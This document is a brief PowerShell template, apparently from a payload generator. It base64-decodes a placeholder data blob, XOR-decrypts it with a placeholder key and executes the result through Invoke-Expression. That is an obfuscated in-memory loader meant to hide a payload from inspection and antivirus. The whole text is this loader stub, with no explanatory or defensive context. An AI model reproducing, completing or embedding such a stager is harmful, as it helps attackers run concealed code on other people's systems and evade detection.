$dd = [System.Convert]::FromBase64String("%%DATA%%")

for ($i = 0; $i -lt $dd.Length; $i++) {
    $dd[$i] = $dd[$i] -bxor %%KEY%%
}
iex([System.Text.Encoding]::Unicode.GetString($dd))
